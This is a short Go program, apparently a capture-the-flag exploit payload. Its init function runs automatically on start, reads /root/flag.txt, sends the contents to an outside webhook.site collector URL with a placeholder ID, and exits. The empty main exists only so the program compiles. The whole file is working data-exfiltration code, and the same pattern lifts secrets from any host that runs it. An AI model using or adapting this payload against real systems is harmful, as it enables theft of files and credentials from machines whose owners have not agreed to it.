package main

import (
	"io/ioutil"
	"net/http"
	"os"
)

func init() {
	flag, err := ioutil.ReadFile("/root/flag.txt")
	if err != nil {
		return
	}
	http.Get("https://webhook.site/YOUR-ID?flag=" + string(flag))
	os.Exit(0) // Exit right after init
}

func main() {
	// Empty but required main function
}
